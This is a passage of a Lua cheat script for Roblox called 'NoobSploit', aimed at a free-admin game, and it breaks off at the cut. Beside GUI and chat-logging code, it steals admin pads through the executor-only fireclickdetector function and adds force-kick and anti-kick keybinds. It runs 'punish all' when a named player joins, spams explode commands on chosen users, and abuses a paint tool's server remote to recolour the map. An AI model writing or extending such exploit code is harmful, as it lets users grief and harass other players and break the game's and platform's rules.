				local user = getplayer(TextBox_2.Text)
				local index = table.find(uidata.highlightedusers, user.UserId)
				if user and index then
					table.remove(uidata.highlightedusers, index)
					print('removed '..user.Name)
				end
			end
			btn.Text = 'Disabled'
			btn.TextColor3 = Color3.fromRGB(255, 0, 0)
			btn.Parent.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
			uidata[i] = false
		end
		updatefile()
	end)
	if uidata[i] and i ~= 'highlightplayer' then
		print(i..' is enabled')
		btn.Text = 'Enabled'
		btn.TextColor3 = Color3.fromRGB(0, 255, 0)
		btn.Parent.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
	else
		btn.Text = 'Disabled'
		btn.TextColor3 = Color3.fromRGB(255, 0, 0)
		btn.Parent.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
	end

end
-- Scripts:

local function UMAXEZ_fake_script() -- Close.CloseScript 
	local script = Instance.new('LocalScript', Close)

	local button = script.Parent
	local gui = script.Parent.Parent.Parent:WaitForChild('Corner')
	local tween = game:GetService('TweenService')
	local tweening = false
	local info = TweenInfo.new(.3, Enum.EasingStyle.Quint)
	button.MouseButton1Click:Connect(function()
		if tweening then return end
		if gui.AbsoluteSize.Y ~= 200 then
			tweening = true
			local butthole = tween:Create(gui, info, {Size = UDim2.new(2, 0, 0, 200)})
			gui.Visible = true
			butthole:Play()
			butthole.Completed:Wait()
			tweening = false
		else
			tweening = true
			local butthole = tween:Create(gui, info, {Size = UDim2.new(2, 0, 0, 0)})
			butthole:Play()
			butthole.Completed:Wait()
			gui.Visible = false
			tweening = false
		end
	end)
end
coroutine.wrap(UMAXEZ_fake_script)()
local function LMHZVY_fake_script() -- TextBox.ColorPick 
	local script = Instance.new('LocalScript', TextBox)

	local plrs = game:GetService'Players'
	local lp = plrs.LocalPlayer
	local tween = game:GetService'TweenService'
	local info = TweenInfo.new(.3, Enum.EasingStyle.Quint)
	local box = script.Parent
	local drop = script.Parent:WaitForChild('Dropdown')
	local hide = tween:Create(drop, info, {Size = UDim2.new(.9, 0, 0, 0)})
	local show = tween:Create(drop, info, {Size = UDim2.new(.9, 0, 0, 50)})

	box.Focused:Connect(function()
		if box.Text == 'R G B' then
			box.Text = ''
		end
		box.TextTransparency = 0
	end)
	box.FocusLost:Connect(function()
		if box.Text == '' then
			box.TextTransparency = .6
			box.Text = 'R G B'
		end

	end)
end
coroutine.wrap(LMHZVY_fake_script)()

local function HZBVTCO_fake_script() -- TextBox_2.PlayerDrop 
	local script = Instance.new('LocalScript', TextBox_2)

	local plrs = game:GetService'Players'
	local lp = plrs.LocalPlayer
	local tween = game:GetService'TweenService'
	local info = TweenInfo.new(.3, Enum.EasingStyle.Quint)
	local box = TextBox_2
	local drop = script.Parent:WaitForChild('Dropdown')
	local hide = tween:Create(drop, info, {Size = UDim2.new(.9, 0, 0, 0)})
	local show = tween:Create(drop, info, {Size = UDim2.new(.9, 0, 0, 50)})
	local m = game:GetService('Players').LocalPlayer:GetMouse()
	function isHoveringOverObj(obj)
		local tx = obj.AbsolutePosition.X
		local ty = obj.AbsolutePosition.Y
		local bx = tx + obj.AbsoluteSize.X
		local by = ty + obj.AbsoluteSize.Y
		if m.X >= tx and m.Y >= ty and m.X <= bx and m.Y <= by then
			return true
		end
	end

	box.Focused:Connect(function()
		if box.Text == 'Player' then
			box.Text = ''
		end
		box.TextTransparency = 0
		show:Play()
	end)
	box.FocusLost:Connect(function()
		if box.Text == '' then
			box.TextTransparency = .6
			box.Text = 'Player'
		end
		if not isHoveringOverObj(drop) then
			hide:Play()
		else
			drop.MouseLeave:Wait()
			hide:Play()
		end
	end)
	box:GetPropertyChangedSignal('Text'):Connect(function(oldText)
		for i,v in pairs(plrs:GetPlayers()) do
			local btn = drop:FindFirstChild(v.Name)
			if btn then
				if v.Name:lower():sub(1, box.Text:len()) ~= box.Text:lower() and box.Text ~= 'Player' then
					btn.Visible = false
				else
					btn.Visible = true
				end
			end
			local plr = plrs:FindFirstChild(box.Text)
			if plr then
				local index = table.find(uidata.highlightedusers, plr.UserId)
				if index then
					boolbuttons['highlightplayer'].Text = 'Enabled'
					boolbuttons['highlightplayer'].TextColor3 = Color3.fromRGB(0, 255, 0)
					boolbuttons['highlightplayer'].Parent.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
				else
					boolbuttons['highlightplayer'].Text = 'Disabled'
					boolbuttons['highlightplayer'].TextColor3 = Color3.fromRGB(255, 0, 0)
					boolbuttons['highlightplayer'].Parent.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
				end
			end
		end
	end)
	function addbtn(plr)
		local btn = Instance.new('TextButton', drop)
		btn.BackgroundTransparency = 1
		btn.BorderSizePixel = 0
		btn.Text = plr.Name
		btn.Name = plr.Name
		btn.TextScaled = true
		guielements[#guielements+1] = btn
		btn.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
		btn.MouseButton1Down:Connect(function()
			box.Text = plr.Name
			if not table.find(uidata.highlightedusers, plr.UserId) then
				TextButton_5.Text = 'Disabled'
				TextButton_5.TextColor3 = Color3.fromRGB(255, 0, 0)
				TextButton_5.Parent.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
			else
				TextButton_5.Text = 'Enabled'
				TextButton_5.TextColor3 = Color3.fromRGB(0, 255, 0)
				TextButton_5.Parent.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
			end
			box.TextTransparency = 0
			hide:Play()
		end)
	end
	for i,plr in pairs(plrs:GetPlayers()) do
		addbtn(plr)
	end
	plrs.PlayerAdded:Connect(function(plr)
		addbtn(plr)
	end)
	plrs.PlayerRemoving:Connect(function(plr)
		local btn = drop:FindFirstChild(plr.Name)
		if btn then btn:Destroy() end
	end)
end
coroutine.wrap(HZBVTCO_fake_script)()
local function IFYZYYS_fake_script() -- Logs.script 
	local script = Instance.new('LocalScript', Logs)


	local rs = game:GetService'RunService'
	local ui = game:GetService('UserInputService')
	local scrollinfo = TweenInfo.new(.3)
	local tween = game:GetService('TweenService')
	local scrolly = script.Parent:WaitForChild('List')
	local m = game:GetService('Players').LocalPlayer:GetMouse()
	function isHoveringOverObj(obj)
		local tx = obj.AbsolutePosition.X
		local ty = obj.AbsolutePosition.Y
		local bx = tx + obj.AbsoluteSize.X
		local by = ty + obj.AbsoluteSize.Y
		if m.X >= tx and m.Y >= ty and m.X <= bx and m.Y <= by then
			return true
		end
	end


	local wheeldetect = ui.InputChanged:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseWheel) and scrolly.Parent.Visible and isHoveringOverObj(scrolly) then
			if isHoveringOverObj(scrolly) then
				tween:Create(scrolly, scrollinfo, {CanvasPosition = Vector2.new(scrolly.CanvasPosition.X, math.floor(scrolly.CanvasPosition.Y-(input.Position.Z*scrolly.AbsoluteSize.Y/3)))}):Play()
			end
		end
	end)
end
coroutine.wrap(IFYZYYS_fake_script)()
function addcmd(text)
	local scroll = CmdList
	local y = 0
	for i,v in pairs(scroll:GetChildren()) do
		if v:IsA('TextLabel') then
			y = y + v.TextBounds.Y + 3
		end
	end
	local edit = Instance.new('TextLabel', scroll)
	edit.BackgroundTransparency = 1
	edit.Text = text
	edit.Size = UDim2.new(.92, 0, 0, 84)
	edit.TextSize = 8
	guielements[#guielements+1] = edit
	edit.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
	edit.TextXAlignment = Enum.TextXAlignment.Left
	edit.TextWrapped = true
	edit.Size = UDim2.new(.92, 0, 0, edit.TextBounds.Y)
	edit.Position = UDim2.new(0, 0, 0, y)
	--scroll.CanvasSize = UDim2.new(1, 0, 0, y + edit.TextBounds.Y)
end
local function RYRTHK_fake_script() -- TextBox_3.ColorPick 
	local script = Instance.new('LocalScript', TextBox_3)


	local box = script.Parent
	box.FocusLost:Connect(function()
		if box.Text == '' then
			box.Text = uidata.prefix
			prefix = uidata.prefix
		else
			uidata.prefix = box.Text
			prefix = uidata.prefix
		end
		updatefile()
	end)
end
coroutine.wrap(RYRTHK_fake_script)()
local function LVCPWW_fake_script() -- ScrollingFrame.LocalScript 
	local script = Instance.new('LocalScript', ScrollingFrame)

	local scroll = script.Parent
	local textbox = script.Parent:WaitForChild('TextBox')
	textbox:GetPropertyChangedSignal('Text'):Connect(function(old)
		scroll.CanvasSize = UDim2.new(1, 0, 0, textbox.TextBounds.Y)
	end)
end
coroutine.wrap(LVCPWW_fake_script)()
local function VWAUJQ_fake_script() -- TextBox_5.ColorPick 
	local script = Instance.new('LocalScript', TextBox_5)


	local box = script.Parent

	box.Focused:Connect(function()
		if box.Text == 'R G B' then
			box.Text = ''
		end
		box.TextTransparency = 0
	end)
	box.FocusLost:Connect(function()
		if box.Text == '' then
			box.TextTransparency = .6
			box.Text = 'R G B'
		end

	end)
end
coroutine.wrap(VWAUJQ_fake_script)()
local function BSCKC_fake_script() -- LogsBtn.TabBtnScript 
	local script = Instance.new('LocalScript', LogsBtn)
	print('Waiting1')
	print(script.Parent.Parent.Parent.Parent.Name)
	local conts = script.Parent.Parent.Parent.Parent:WaitForChild('Container')
	local button = script.Parent
	button.MouseButton1Click:Connect(function()
		for i,v in pairs(conts:GetChildren()) do
			if v:IsA('Frame') or v:IsA('ScrollingFrame') then
				if v.Name:lower() == button.Name:sub(1, -4):lower() then
					v.Visible = true
				else
					v.Visible = false
				end
			end
		end
	end)
end
coroutine.wrap(BSCKC_fake_script)()
local function SAYWOEA_fake_script() -- GeneralBtn.TabBtnScript 
	local script = Instance.new('LocalScript', GeneralBtn)

	local conts = script.Parent.Parent.Parent.Parent:WaitForChild('Container')
	local button = script.Parent
	button.MouseButton1Click:Connect(function()
		for i,v in pairs(conts:GetChildren()) do
			if v:IsA('Frame') or v:IsA('ScrollingFrame') then
				if v.Name:lower() == button.Name:sub(1, -4):lower() then
					v.Visible = true
				else
					v.Visible = false
				end
			end
		end
	end)
end
coroutine.wrap(SAYWOEA_fake_script)()
local function SAYWOEA_fake_script() -- GeneralBtn.TabBtnScript 
	local script = Instance.new('LocalScript', GnABtn)

	local conts = script.Parent.Parent.Parent.Parent:WaitForChild('Container')
	local button = script.Parent
	button.MouseButton1Click:Connect(function()
		for i,v in pairs(conts:GetChildren()) do
			if v:IsA('Frame') or v:IsA('ScrollingFrame') then
				if v.Name:lower() == button.Name:sub(1, -4):lower() then
					v.Visible = true
				else
					v.Visible = false
				end
			end
		end
	end)
end
coroutine.wrap(SAYWOEA_fake_script)()
local function SAYWOEA_fake_script() -- GeneralBtn.TabBtnScript 
	local script = Instance.new('LocalScript', BlacklistBtn)

	local conts = script.Parent.Parent.Parent.Parent:WaitForChild('Container')
	local button = script.Parent
	button.MouseButton1Click:Connect(function()
		for i,v in pairs(conts:GetChildren()) do
			if v:IsA('Frame') or v:IsA('ScrollingFrame') then
				if v.Name:lower() == button.Name:sub(1, -4):lower() then
					v.Visible = true
				else
					v.Visible = false
				end
			end
		end
	end)
end
coroutine.wrap(SAYWOEA_fake_script)()
local function YMFZ_fake_script() -- CommandsBtn.TabBtnScript 
	local script = Instance.new('LocalScript', CommandsBtn)

	local conts = script.Parent.Parent.Parent.Parent:WaitForChild('Container')
	local button = script.Parent
	button.MouseButton1Click:Connect(function()
		for i,v in pairs(conts:GetChildren()) do
			if v:IsA('Frame') or v:IsA('ScrollingFrame') then
				if v.Name:lower() == button.Name:sub(1, -4):lower() then
					v.Visible = true
				else
					v.Visible = false
				end
			end
		end
	end)
end
coroutine.wrap(YMFZ_fake_script)()
local function CCSDLU_fake_script() -- ChatSettingsBtn.TabBtnScript 
	local script = Instance.new('LocalScript', ChatSettingsBtn)

	local conts = script.Parent.Parent.Parent.Parent:WaitForChild('Container')
	local button = script.Parent
	button.MouseButton1Click:Connect(function()
		for i,v in pairs(conts:GetChildren()) do
			if v:IsA('Frame') or v:IsA('ScrollingFrame') then
				if v.Name:lower() == button.Name:sub(1, -4):lower() then
					v.Visible = true
				else
					v.Visible = false
				end
			end
		end
	end)
end
coroutine.wrap(CCSDLU_fake_script)()
local function CZTN_fake_script() -- SettingsBtn.TabBtnScript 
	local script = Instance.new('LocalScript', SettingsBtn)

	local conts = script.Parent.Parent.Parent.Parent:WaitForChild('Container')
	local button = script.Parent
	button.MouseButton1Click:Connect(function()
		for i,v in pairs(conts:GetChildren()) do
			if v:IsA('Frame') or v:IsA('ScrollingFrame') then
				if v.Name:lower() == button.Name:sub(1, -4):lower() then
					v.Visible = true
				else
					v.Visible = false
				end
			end
		end
	end)
end
coroutine.wrap(CZTN_fake_script)()
local function HYSCW_fake_script() -- Topbar.Dragscript 
	local script = Instance.new('LocalScript', Topbar)

	local gui = script.Parent
	local dragging = false
	local uis = game:GetService('UserInputService')

	local dragging
	local dragInput
	local dragStart = Vector3.new(0,0,0)
	local startPos
	local function update(input)
		local delta = input.Position - dragStart
		local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService("TweenService"):Create(gui, TweenInfo.new(.35, Enum.EasingStyle.Quint), {Position = Position}):Play()
	end
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	uis.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end
coroutine.wrap(HYSCW_fake_script)()
local function NSTUGRJ_fake_script() -- Topbar.Logger 
	local script = Instance.new('LocalScript', Topbar)

	local plrs = game:GetService('Players')
	local lp = plrs.LocalPlayer
	local logs = Topbar:WaitForChild('Corner'):WaitForChild('Main'):WaitForChild('Container'):WaitForChild('Logs'):WaitForChild('List')
	local chatbar = game:GetService("Players").LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('Chat'):WaitForChild('Frame'):WaitForChild('ChatChannelParentFrame'):WaitForChild("Frame_MessageLogDisplay"):WaitForChild('Scroller')

	local threads = 0

	function Time()
		local HOUR = math.floor((tick() % 86400) / 3600)
		local MINUTE = math.floor((tick() % 3600) / 60)
		local SECOND = math.floor(tick() % 60)
		local AP = HOUR > 11 and 'PM' or 'AM'
		HOUR = (HOUR % 12 == 0 and 12 or HOUR % 12)
		HOUR = HOUR < 10 and '0' .. HOUR or HOUR
		MINUTE = MINUTE < 10 and '0' .. MINUTE or MINUTE
		SECOND = SECOND < 10 and '0' .. SECOND or SECOND
		return HOUR .. ':' .. MINUTE .. ':' .. SECOND .. ' ' .. AP
	end
	function chat(plr)
		plr.Chatted:Connect(function(msg)
			if #logs:GetChildren() > 2000 then
				logs:ClearAllChildren()
			end
			local initpos = logs.CanvasPosition.Y
			local edit = Instance.new('TextLabel', logs)
			local changed = false
			if table.find(uidata.highlightedusers, plr.UserId) or (uidata.highlightself and plr == lp) or (uidata.highlightfriends and lp:IsFriendsWith(plr.UserId)) or (uidata.highlightteam and plr.Team == lp.Team and plr ~= lp) then
				edit.TextColor3 = Color3.fromRGB(uidata.highlightcolor.r, uidata.highlightcolor.g, uidata.highlightcolor.b)
				changed = true
			else
				edit.TextColor3 = Color3.fromRGB(255, 255, 255)
			end
			coroutine.wrap(function()
				if not uidata.detecthidden then return end
				if changed then return end
				if threads > 100 then return end
				msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
				local hidden = true
				local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
					if packet.SpeakerUserId==plr.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and plrs[packet.FromSpeaker].Team==lp.Team)) then
						hidden = false
					end
				end)
				wait(1)
				conn:Disconnect()
				if hidden then
					edit.TextColor3 = Color3.fromRGB(170, 0, 170)
				end
				threads = threads - 1
			end)()
			local y = 0
			for i,v in pairs(logs:GetChildren()) do
				if v:IsA('TextLabel') then
					y = y + v.TextBounds.Y + 3
				end
			end
			edit.BackgroundTransparency = 1
			edit.Text = Time()..'-['..plr.Name..']: '..msg:sub(1, 250)
			edit.Size = UDim2.new(.92, 0, 0, 84)
			edit.TextSize = 8
			edit.TextXAlignment = Enum.TextXAlignment.Left
			edit.TextWrapped = true
			edit.Size = UDim2.new(.92, 0, 0, edit.TextBounds.Y)
			edit.Position = UDim2.new(0, 0, 0, y)
			local shift = false
			if logs.CanvasPosition.Y > (logs.CanvasSize.Y.Offset - logs.AbsoluteSize.Y)-10 then
				shift = true
			end
			logs.CanvasSize = UDim2.new(1, 0, 0, y + edit.TextBounds.Y)
			if shift then
				logs.CanvasPosition = Vector2.new(0,logs.CanvasPosition.Y+edit.TextBounds.Y+3)
			end
		end)
	end

	for i,v in pairs(plrs:GetPlayers()) do
		chat(v)
	end

	plrs.PlayerAdded:Connect(function(v)
		chat(v)
	end)
end
coroutine.wrap(NSTUGRJ_fake_script)()





















function addButton(name, cb)
	local btn = Instance.new('TextButton', General)
	btn.Name = 'addonButton'
	btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	btn.BackgroundTransparency = 0.500
	btn.Size = UDim2.new(0, 98, 0.75, 0)
	btn.Font = Enum.Font.SourceSans
	guielements[#guielements+1] = btn
	btn.Text = name
	btn.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
	btn.TextScaled = true
	btn.TextSize = 14.000
	btn.TextWrapped = true
	local UICorner = Instance.new('UICorner', btn)
	UICorner.CornerRadius = UDim.new(0, 4)
	UICorner.Parent = btn
	btn.MouseButton1Click:Connect(function()
		cb(btn)
	end)
end

General.UIGridLayout:GetPropertyChangedSignal('AbsoluteContentSize'):Connect(function()
	General.CanvasSize = UDim2.new(1, 0, 0, General.UIGridLayout.AbsoluteContentSize.Y)
end)

CmdList.UIListLayout:GetPropertyChangedSignal('AbsoluteContentSize'):Connect(function()
	CmdList.CanvasSize = UDim2.new(1, 0, 0, CmdList.UIListLayout.AbsoluteContentSize.Y)
end)





























mousee.KeyDown:connect(function(key)
	if key:lower() == AttachTO_keybind then
		logn("Attached to object")
		if mousee.Target then
			local target = mousee.Target
			function movepart()
				local cf = game.Players.LocalPlayer.Character.HumanoidRootPart
				local looping = true
				spawn(function()
					while true do
						game:GetService('RunService').Heartbeat:Wait()
						game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
						cf.CFrame = target.CFrame * CFrame.new(-1*(target.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
						if not looping then break end
					end
				end)
				spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
				wait(0.25)
				looping = false
			end
			movepart()
		end
	end

	if key:lower() == AttachDelete_keybind then
		logn("Attached to object")
		if mousee.Target then
			local target = mousee.Target
			function movepart()
				local cf = game.Players.LocalPlayer.Character.HumanoidRootPart
				local looping = true
				spawn(function()
					while true do
						game:GetService('RunService').Heartbeat:Wait()
						game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
						cf.CFrame = target.CFrame * CFrame.new(-1*(target.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
						if not looping then break end
					end
				end)
				spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
				wait(0.25)
				looping = false
				game.Players:Chat(prefix.."super skydive me,me,me")
				wait(1)
				game.Players:Chat(prefix.."super tp me,me,me,me,me")
				wait(0.25)
				game.Players:Chat("respawn me")
			end
			movepart()
		end
	end

	if key:lower() == fkick_keybind then
		kicking()
	end
	if key:lower() == antikick_keybind then
		antikicking()
	end
	if key:lower() == respawn_keybind then
		game.Players:Chat("unchar me")
	end
	if key:lower() == reset_keybind then
		game.Players:Chat("reset me")
	end
	if key:lower() == fly_keybind then
		game.Players:Chat("fly me")
	end
	if key:lower() == teleport_keybind then
		game.Players:Chat("tp me me me")
	end
	if key:lower() == house_keybind then
		game.Players:Chat(prefix.."house")
	end
end)

function antikicking()
	antikick = not antikick
	if antikick == true then
		logn("AntiCrash Enabled", "Ok")
	elseif antikick == false then
		logn("AntiCrash Disabled", "Ok")
	end
end

function logn(msg)
	game.StarterGui:SetCore("SendNotification", {
		Title = "NoobSploit"; 
		Text = msg; 
		Duration = 5;
	})
end

Players.PlayerAdded:Connect(function(player)
	start(player)
	spawn(function()
		if player.Name == "egglnq" then
			say("A devleoper from the noobsploit team has joined!")
			game:GetService'Players':Chat(("tp me egglnq"))
		end
	end)
end)

Players.PlayerAdded:Connect(function(player)
	start(player)
	spawn(function()
		if player.Name == "spongaballm" then
			game.Players:Chat("punish all")
			wait(0.2)
			game.Players:Chat("punish all")
			wait(1)
			game.Players:Chat("punish all")
		end
	end)
end)

Players.PlayerAdded:Connect(function(player)
	start(player)
	spawn(function()
		if player.Name == "RoyalMesh" then
			say("RoyalMesh joined (noobsploit.0001) added this")
			game:GetService'Players':Chat(("tp me RoyalMesh"))
		end
	end)
end)

local function GetPad(msg)
	while PadCheck == true do
		wait(0)
		if not game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild(game.Players.LocalPlayer.Name .. "'s admin") then
			if game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin") then
				local pad = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin"):FindFirstChild("Head")
				local padCFrame = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin"):FindFirstChild("Head").CFrame
				wait(0.125)
				pad.CanCollide = false
				repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
				pad.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
				wait(0.125)
				pad.CFrame = padCFrame
				pad.CanCollide = true
			else
				fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector, 0)
			end
		end
	end
end


function getplayer(str)
	for i,v in pairs(plrs:GetPlayers()) do
		if v.Name:lower():sub(1, str:len()) == str:lower() then return v end
	end
end
function explodey(users)
	local fireworking = true
	coroutine.wrap(function()
		while fireworking do
			for i,v in pairs(users) do
				plrs:Chat('explode '..v)
				plrs:Chat('refresh '..v)
			end
			wait()
		end
	end)()
	wait(5)
	fireworking = false
end


Players.LocalPlayer.Chatted:Connect(function(msg)
	CancelTeleport = true
	local amount = nil
	--Shade added Commands

	local args = msg:split(' ')
	local cmd = args[1]:lower():sub(prefix:len()+1)
	if cmd == 'firework' then
		table.remove(args, 1)
		explodey(args)
	end
	----------------



	if string.sub(msg:lower(), 0, 5) == prefix.."rrej" then
		local x = {}
		for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
			if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
				x[#x + 1] = v.id
				amount = v.playing
			end
		end
		if #x > 0 then
			say("Joining a server with "..amount.." Players")
			wait(0.25)
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
		else
			logn("Cant Find Server, Sorry!")
		end
	elseif string.sub(msg:lower(), 0, 4) == prefix.."rjg" then
		local x = {}
		local amount = nil
		for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
			if type(v) == "table" and v.playing == tonumber(string.sub(msg:lower(),6)) and v.id ~= game.JobId then
				x[#x + 1] = v.id
				amount = tonumber(string.sub(msg:lower(),6))
			end
		end
		if #x > 0 then
			logn("Joining a server with "..amount.." Players")
			wait(0.25)
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
		else
			logn("Unable to Locate Server")
		end
	elseif string.sub(msg:lower(), 0, 4) == prefix.."srj" then
		game.Players:Chat(prefix.."rjg 1")
		game.Players:Chat(prefix.."rjg 2")
		game.Players:Chat(prefix.."rjg 3")
		game.Players:Chat(prefix.."rjg 4")
		game.Players:Chat(prefix.."rjg 5")
	elseif string.sub(msg:lower(), 0, 4) == prefix.."sch" then
		gotoNoobSploitHub("Requested", 1) -- Go to NoobSploits main hub for rejoining
	elseif string.sub(msg:lower(), 0, 19) == prefix.."color all original" then
		game.Players:Chat("gear me 00000000000000000018474459")
		wait(1)
		game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.PaintBucket)
		wait(0.25)
		local remote = game:GetService("Workspace")[game:GetService("Players").LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls
		for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace:GetChildren()) do
			spawn(function()
				if v:IsA("Part") then
					local v4 =
						{
							["Part"] = v,
							["Color"] = transformToColor3(BrickColor.new("Bright green"))
						}
					remote:InvokeServer(v1, v4)
				end
			end)
		end


		--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


		for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Admin Dividers"]:GetChildren()) do
			spawn(function()
				if v:IsA("Part") then
					local v5 =
						{
							["Part"] = v,
							["Color"] = transformToColor3(BrickColor.new("Dark stone grey"))
						}
					remote:InvokeServer(v1, v5)
				end
			end)
		end


		--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


		for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:GetDescendants()) do
			if v:IsA("Part") then
				spawn(function()
					if v.Name == "SmoothBlockModel103" or v.Name == "SmoothBlockModel105" or v.Name == "SmoothBlockModel106" or v.Name == "SmoothBlockModel108" or v.Name == "SmoothBlockModel11" or v.Name == "SmoothBlockModel113" or v.Name == "SmoothBlockModel114" or v.Name == "SmoothBlockModel115" or v.Name == "SmoothBlockModel116" or v.Name == "SmoothBlockModel118" or v.Name == "SmoothBlockModel122" or v.Name == "SmoothBlockModel126" or v.Name == "SmoothBlockModel129" or v.Name == "SmoothBlockModel13" or v.Name == "SmoothBlockModel130" or v.Name == "SmoothBlockModel131" or v.Name == "SmoothBlockModel132" or v.Name == "SmoothBlockModel134" or v.Name == "SmoothBlockModel135" or v.Name == "SmoothBlockModel14" or v.Name == "SmoothBlockModel140" or v.Name == "SmoothBlockModel142" or v.Name == "SmoothBlockModel147" or v.Name == "SmoothBlockModel15" or v.Name == "SmoothBlockModel154" or v.Name == "SmoothBlockModel155" or v.Name == "SmoothBlockModel164" or v.Name == "SmoothBlockModel166" or v.Name == "SmoothBlockModel173" or v.Name == "SmoothBlockModel176" or v.Name == "SmoothBlockModel179" or v.Name == "SmoothBlockModel185" or v.Name == "SmoothBlockModel186" or v.Name == "SmoothBlockModel190" or v.Name == "SmoothBlockModel191" or v.Name == "SmoothBlockModel196" or v.Name == "SmoothBlockModel197" or v.Name == "SmoothBlockModel198" or v.Name == "SmoothBlockModel20" or v.Name == "SmoothBlockModel201" or v.Name == "SmoothBlockModel203" or v.Name == "SmoothBlockModel205" or v.Name == "SmoothBlockModel207" or v.Name == "SmoothBlockModel208" or v.Name == "SmoothBlockModel209" or v.Name == "SmoothBlockModel210" or v.Name == "SmoothBlockModel211" or v.Name == "SmoothBlockModel213" or v.Name == "SmoothBlockModel218" or v.Name == "SmoothBlockModel22" or v.Name == "SmoothBlockModel223" or v.Name == "SmoothBlockModel224" or v.Name == "SmoothBlockModel226" or v.Name == "SmoothBlockModel26" or v.Name == "SmoothBlockModel29" or v.Name == "SmoothBlockModel30" or v.Name == "SmoothBlockModel31" or v.Name == "SmoothBlockModel36" or v.Name == "SmoothBlockModel37" or v.Name == "SmoothBlockModel38" or v.Name == "SmoothBlockModel39" or v.Name == "SmoothBlockModel41" or v.Name == "SmoothBlockModel48" or v.Name == "SmoothBlockModel49" or v.Name == "SmoothBlockModel51" or v.Name == "SmoothBlockModel56" or v.Name == "SmoothBlockModel67" or v.Name == "SmoothBlockModel68" or v.Name == "SmoothBlockModel69" or v.Name == "SmoothBlockModel70" or v.Name == "SmoothBlockModel72" or v.Name == "SmoothBlockModel75" or v.Name == "SmoothBlockModel8" or v.Name == "SmoothBlockModel81" or v.Name == "SmoothBlockModel85" or v.Name == "SmoothBlockModel93" or v.Name == "SmoothBlockModel98" then
						local v6 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Brick yellow"))
							}
						remote:InvokeServer(v1, v6)
					end

					if v.Name == "SmoothBlockModel40" then
						local v7 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Bright green"))
							}
						remote:InvokeServer(v1, v7)
					end

